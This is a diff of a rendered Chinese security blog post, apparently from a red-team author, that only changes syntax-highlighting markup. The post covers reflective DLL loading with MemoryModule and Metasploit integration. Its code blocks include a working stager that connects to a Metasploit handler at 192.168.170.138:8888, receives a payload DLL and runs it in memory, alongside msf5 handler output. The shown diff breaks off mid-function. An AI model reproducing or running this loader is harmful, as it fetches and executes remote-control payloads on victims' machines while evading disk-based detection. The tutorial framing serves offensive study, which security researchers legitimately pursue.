@@ -93,28 +93,28 @@
 <pre tabindex="0"><code>#include &lt;Windows.h&gt;
 
 VOID msg(VOID){
-	MessageBox(NULL,TEXT(&quot;Test&quot;),TEXT(&quot;Hello&quot;),MB_OK);
+	MessageBox(NULL,TEXT(&#34;Test&#34;),TEXT(&#34;Hello&#34;),MB_OK);
 	return;
 }
 </code></pre><p>这里我采用了Def文件来进行导出：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/81d0151a-4f5f-11ec-a1bd-00d861bf4abb.png" alt="2020-01-03-13-05-56"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/820ac94e-4f5f-11ec-ba78-00d861bf4abb.png" alt="2020-01-03-13-06-15"></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);
-
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
-{
-	msg RunMsg;
-	HMODULE  hBadCode <span style="color:#f92672">=</span> LoadLibrary(TEXT(<span style="color:#e6db74">&#34;BadCode-DLL.dll&#34;</span>));
-
-	RunMsg <span style="color:#f92672">=</span> (msg)GetProcAddress(hBadCode,<span style="color:#e6db74">&#34;msg&#34;</span>);
-	RunMsg();
-	FreeLibrary(hBadCode);
-
-	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-}
-</code></pre></div><p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	msg RunMsg;
+</span></span><span style="display:flex;"><span>	HMODULE  hBadCode <span style="color:#f92672">=</span> LoadLibrary(TEXT(<span style="color:#e6db74">&#34;BadCode-DLL.dll&#34;</span>));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	RunMsg <span style="color:#f92672">=</span> (msg)GetProcAddress(hBadCode,<span style="color:#e6db74">&#34;msg&#34;</span>);
+</span></span><span style="display:flex;"><span>	RunMsg();
+</span></span><span style="display:flex;"><span>	FreeLibrary(hBadCode);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>通过LoadLibrary这个API来加载DLL文件，使其运行，看起来是一个基础操作，那么还有另外一种方式吗？</p>
 <p>接下来贴上MemoryModule的使用方法：</p>
 <ol>
 <li>将要加载的PE文件读入内存</li>
@@ -128,71 +128,71 @@ VOID msg(VOID){
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/824455c4-4f5f-11ec-b777-00d861bf4abb.png" alt="2020-01-03-13-06-38"></p>
 <p>主要是：<code>MemoryModule.h</code>、<code>MemoryModule.cpp</code></p>
 <p>加载代码</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;MemoryModule.h&#34;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);
-
-<span style="color:#75715e">// 打开文件并获取大小
-</span><span style="color:#75715e"></span>DWORD <span style="color:#a6e22e">OpenBadCodeDLL</span>(HANDLE <span style="color:#f92672">&amp;</span> hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
-	DWORD dwHighFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-	DWORD dwLowFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-	<span style="color:#75715e">// 打开文件
-</span><span style="color:#75715e"></span>	hBadCodeDll <span style="color:#f92672">=</span> CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
-	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
-		<span style="color:#66d9ef">return</span> GetLastError();
-	}
-	dwLowFileSize <span style="color:#f92672">=</span> GetFileSize(hBadCodeDll,<span style="color:#f92672">&amp;</span>dwHighFileSize);
-	<span style="color:#66d9ef">return</span> dwLowFileSize;
-}
-
-
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
-{
-	msg RunMsg;  <span style="color:#75715e">// msg函数的函数指针
-</span><span style="color:#75715e"></span>	HMEMORYMODULE hModule; <span style="color:#75715e">// MemoryModule句柄，应该可以这么理解,,
-</span><span style="color:#75715e"></span>	HANDLE hBadCodeDll <span style="color:#f92672">=</span> INVALID_HANDLE_VALUE; <span style="color:#75715e">// 打开PE文件的句柄
-</span><span style="color:#75715e"></span>	WCHAR szBadCodeFile[] <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">admin</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Documents</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Visual Studio 2012</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Projects</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BadCode</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Debug</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BadCode-DLL.dll&#34;</span>); <span style="color:#75715e">// PE文件的物理路径
-</span><span style="color:#75715e"></span>	DWORD dwFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// PE文件大小
-</span><span style="color:#75715e"></span>	DWORD dwReadOfFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// 已读取的PE文件大小
-</span><span style="color:#75715e"></span>	PBYTE bFileBuffer <span style="color:#f92672">=</span> NULL; <span style="color:#75715e">// PE文件的内存地址
-</span><span style="color:#75715e"></span>	
-	<span style="color:#75715e">// 打开文件
-</span><span style="color:#75715e"></span>	dwFileSize <span style="color:#f92672">=</span> OpenBadCodeDLL(hBadCodeDll, szBadCodeFile);
-	<span style="color:#75715e">// 如果打开失败直接退出
-</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
-		<span style="color:#66d9ef">return</span> GetLastError();
-	}
-	<span style="color:#75715e">// 申请放置PE文件的内存空间
-</span><span style="color:#75715e"></span>	bFileBuffer <span style="color:#f92672">=</span> new BYTE[dwFileSize];
-	<span style="color:#75715e">// 读取文件
-</span><span style="color:#75715e"></span>	ReadFile(hBadCodeDll,bFileBuffer,dwFileSize,<span style="color:#f92672">&amp;</span>dwReadOfFileSize,NULL);
-	<span style="color:#75715e">// 如果读取错误直接退出
-</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(dwReadOfFileSize <span style="color:#f92672">!=</span> dwFileSize){
-		<span style="color:#66d9ef">return</span> GetLastError();
-	}
-	<span style="color:#75715e">// 关闭打开PE文件的句柄
-</span><span style="color:#75715e"></span>	CloseHandle(hBadCodeDll);
-	<span style="color:#75715e">// 导入PE文件
-</span><span style="color:#75715e"></span>	hModule <span style="color:#f92672">=</span> MemoryLoadLibrary(bFileBuffer);
-	<span style="color:#75715e">// 如果加载失败，就退出
-</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hModule <span style="color:#f92672">==</span> NULL){
-		delete [] bFileBuffer;
-		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-	}
-	<span style="color:#75715e">// 获取msg导出函数地址
-</span><span style="color:#75715e"></span>	RunMsg <span style="color:#f92672">=</span> (msg)MemoryGetProcAddress(hModule,<span style="color:#e6db74">&#34;msg&#34;</span>);
-	<span style="color:#75715e">// 运行msg函数
-</span><span style="color:#75715e"></span>	RunMsg();
-	<span style="color:#75715e">// 释放资源
-</span><span style="color:#75715e"></span>	MemoryFreeLibrary(hModule);
-	<span style="color:#75715e">// 释放PE内存
-</span><span style="color:#75715e"></span>	delete [] bFileBuffer;
-
-	<span style="color:#66d9ef">return</span> GetLastError();
-}
-</code></pre></div><p>运行结果：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;MemoryModule.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">// 打开文件并获取大小
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>DWORD <span style="color:#a6e22e">OpenBadCodeDLL</span>(HANDLE <span style="color:#f92672">&amp;</span> hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
+</span></span><span style="display:flex;"><span>	DWORD dwHighFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	DWORD dwLowFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 打开文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	hBadCodeDll <span style="color:#f92672">=</span> CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> GetLastError();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	dwLowFileSize <span style="color:#f92672">=</span> GetFileSize(hBadCodeDll,<span style="color:#f92672">&amp;</span>dwHighFileSize);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> dwLowFileSize;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	msg RunMsg;  <span style="color:#75715e">// msg函数的函数指针
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	HMEMORYMODULE hModule; <span style="color:#75715e">// MemoryModule句柄，应该可以这么理解,,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	HANDLE hBadCodeDll <span style="color:#f92672">=</span> INVALID_HANDLE_VALUE; <span style="color:#75715e">// 打开PE文件的句柄
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	WCHAR szBadCodeFile[] <span style="color:#f92672">=</span> TEXT(<span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Users</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">admin</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Documents</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Visual Studio 2012</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Projects</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BadCode</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Debug</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">BadCode-DLL.dll&#34;</span>); <span style="color:#75715e">// PE文件的物理路径
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DWORD dwFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// PE文件大小
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	DWORD dwReadOfFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; <span style="color:#75715e">// 已读取的PE文件大小
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	PBYTE bFileBuffer <span style="color:#f92672">=</span> NULL; <span style="color:#75715e">// PE文件的内存地址
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 打开文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	dwFileSize <span style="color:#f92672">=</span> OpenBadCodeDLL(hBadCodeDll, szBadCodeFile);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 如果打开失败直接退出
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> GetLastError();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 申请放置PE文件的内存空间
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	bFileBuffer <span style="color:#f92672">=</span> new BYTE[dwFileSize];
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 读取文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	ReadFile(hBadCodeDll,bFileBuffer,dwFileSize,<span style="color:#f92672">&amp;</span>dwReadOfFileSize,NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 如果读取错误直接退出
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(dwReadOfFileSize <span style="color:#f92672">!=</span> dwFileSize){
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> GetLastError();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 关闭打开PE文件的句柄
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	CloseHandle(hBadCodeDll);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 导入PE文件
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	hModule <span style="color:#f92672">=</span> MemoryLoadLibrary(bFileBuffer);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 如果加载失败，就退出
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hModule <span style="color:#f92672">==</span> NULL){
+</span></span><span style="display:flex;"><span>		delete [] bFileBuffer;
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 获取msg导出函数地址
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	RunMsg <span style="color:#f92672">=</span> (msg)MemoryGetProcAddress(hModule,<span style="color:#e6db74">&#34;msg&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 运行msg函数
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	RunMsg();
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 释放资源
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	MemoryFreeLibrary(hModule);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// 释放PE内存
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	delete [] bFileBuffer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> GetLastError();
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>运行结果：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/8277ad7a-4f5f-11ec-9a01-00d861bf4abb.png" alt="2020-01-03-13-06-52"></p>
 <p>能够看到，成功加载并执行了msg函数。</p>
 <h2 id="0x03-反射dll与msf联动">0x03 反射DLL与MSF联动</h2>
@@ -224,121 +224,120 @@ msf5 exploit(multi/handler) &gt; exploit -j
 [*] Started reverse TCP handler on 192.168.170.138:8888 
 msf5 exploit(multi/handler) &gt; 
 </code></pre><p>此时就需要来撸码了，实现一个客户端，去Msf上获取DLL：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;WinSock2.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;MemoryModule.h&#34;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#pragma comment(lib,&#34;ws2_32.lib&#34;)
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">#define PAYLOAD_SIZE 1024*512
-</span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span> (<span style="color:#f92672">*</span>Module)(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved);
-
-<span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);
-PBYTE bFileBuffer <span style="color:#f92672">=</span> NULL;
-
-
-BOOL <span style="color:#a6e22e">GetPEDLL</span>(){
-	
-	DWORD dwError;
-	WORD sockVersion <span style="color:#f92672">=</span> MAKEWORD(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>);
-	WSADATA wsaData;
-	SOCKET socks;
-	SHORT sListenPort <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>;
-	<span style="color:#66d9ef">struct</span> sockaddr_in sin;
-
-	<span style="color:#66d9ef">if</span> (WSAStartup(sockVersion, <span style="color:#f92672">&amp;</span>wsaData) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
-	{
-		dwError <span style="color:#f92672">=</span> GetLastError();
-		printf(<span style="color:#e6db74">&#34;[*]WSAStarup Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
-		<span style="color:#66d9ef">return</span> FALSE;
-	}
-	
-	socks <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-
-	<span style="color:#66d9ef">if</span> (socks <span style="color:#f92672">==</span> INVALID_SOCKET)
-	{
-		dwError <span style="color:#f92672">=</span> GetLastError();
-		printf(<span style="color:#e6db74">&#34;[*]Socket Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
-		<span style="color:#66d9ef">return</span> FALSE;
-	}
-
-	sin.sin_family <span style="color:#f92672">=</span> AF_INET;
-	sin.sin_port <span style="color:#f92672">=</span> htons(sListenPort);
-	sin.sin_addr.S_un.S_addr <span style="color:#f92672">=</span> inet_addr(<span style="color:#e6db74">&#34;192.168.170.138&#34;</span>);
-
-	<span style="color:#66d9ef">if</span>(connect(socks,(<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sin,<span style="color:#66d9ef">sizeof</span>(sin)) <span style="color:#f92672">==</span> SOCKET_ERROR )
-	{
-		dwError <span style="color:#f92672">=</span> GetLastError();
-		printf(<span style="color:#e6db74">&#34;[*]Bind Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
-		<span style="color:#66d9ef">return</span> FALSE;
-	}
-	
-	<span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
-	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">2650</span>,NULL);
-	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
-	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
-	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">4</span>,NULL);
-
-	ZeroMemory(bFileBuffer,PAYLOAD_SIZE);
-
-	
-	ret <span style="color:#f92672">=</span> recv(socks,(PCHAR)bFileBuffer,<span style="color:#ae81ff">5120</span>,NULL);
-
-	<span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
-	{
-		closesocket(socks);
-	}
-
-
-	<span style="color:#66d9ef">return</span> TRUE;
-} 
-
-<span style="color:#75715e">// 打开文件并获取大小
-</span><span style="color:#75715e"></span>DWORD <span style="color:#a6e22e">OpenBadCodeDLL</span>(HANDLE <span style="color:#f92672">&amp;</span> hBadCodeDll, LPCWSTR lpwszBadCodeFileName){
-	DWORD dwHighFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-	DWORD dwLowFileSize <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
-	<span style="color:#75715e">// 打开文件
-</span><span style="color:#75715e"></span>	hBadCodeDll <span style="color:#f92672">=</span> CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,NULL);
-	<span style="color:#66d9ef">if</span>(hBadCodeDll <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE){
-		<span style="color:#66d9ef">return</span> GetLastError();
-	}
-	dwLowFileSize <span style="color:#f92672">=</span> GetFileSize(hBadCodeDll,<span style="color:#f92672">&amp;</span>dwHighFileSize);
-	<span style="color:#66d9ef">return</span> dwLowFileSize;
-}
-
-
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
-{
-	
-	HMEMORYMODULE hModule;
-	Module DllMain;
-	bFileBuffer <span style="color:#f92672">=</span> new BYTE[PAYLOAD_SIZE];
-	GetPEDLL();
-	<span style="color:#75715e">// 导入PE文件
-</span><span style="color:#75715e"></span>	hModule <span style="color:#f92672">=</span> MemoryLoadLibrary(bFileBuffer);
-	<span style="color:#75715e">// 如果加载失败，就退出
-</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span>(hModule <span style="color:#f92672">==</span> NULL){
-		delete [] bFileBuffer;
-		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-	}
-	<span style="color:#75715e">// 获取msg导出函数地址
-</span><span style="color:#75715e"></span>	DllMain <span style="color:#f92672">=</span> (Module)MemoryGetProcAddress(hModule,<span style="color:#e6db74">&#34;DllMain&#34;</span>);
-	<span style="color:#75715e">// 运行msg函数
-</span><span style="color:#75715e"></span>	DllMain(<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">0</span>);
-	<span style="color:#75715e">// 释放资源
-</span><span style="color:#75715e"></span>	DWORD dwThread;
-	HANDLE hThread <span style="color:#f92672">=</span> CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)DllMain,NULL,NULL,<span style="color:#f92672">&amp;</span>dwThread);
-	
-	WaitForSingleObject(hThread,INFINITE);
-	
-	MemoryFreeLibrary(hModule);
-	<span style="color:#75715e">// 释放PE内存
-</span><span style="color:#75715e"></span>	delete [] bFileBuffer;
-	<span style="color:#66d9ef">return</span> GetLastError();
-}
-
-</code></pre></div><p>GetPEDLL函数主要是从MSF上获取DLL，通过recv函数不断接收，偏移获得DLL地址，然后扔给MemoryGetProcAddress。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;WinSock2.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;MemoryModule.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment(lib,&#34;ws2_32.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define PAYLOAD_SIZE 1024*512
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">BOOL</span> (<span style="color:#f92672">*</span>Module)(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#a6e22e">VOID</span> (<span style="color:#f92672">*</span>msg)(VOID);
+</span></span><span style="display:flex;"><span>PBYTE bFileBuffer <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">GetPEDLL</span>(){
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	DWORD dwError;
+</span></span><span style="display:flex;"><span>	WORD sockVersion <span style="color:#f92672">=</span> MAKEWORD(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>);
+</span></span><span style="display:flex;"><span>	WSADATA wsaData;
+</span></span><span style="display:flex;"><span>	SOCKET socks;
+</span></span><span style="display:flex;"><span>	SHORT sListenPort <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">struct</span> sockaddr_in sin;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (WSAStartup(sockVersion, <span style="color:#f92672">&amp;</span>wsaData) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		dwError <span style="color:#f92672">=</span> GetLastError();
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[*]WSAStarup Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	socks <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (socks <span style="color:#f92672">==</span> INVALID_SOCKET)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		dwError <span style="color:#f92672">=</span> GetLastError();
+</span></span><span style="display:flex;"><span>		printf(<span style="color:#e6db74">&#34;[*]Socket Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> FALSE;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	sin.sin_family <span style="color:#f92672">=</span> AF_INET;
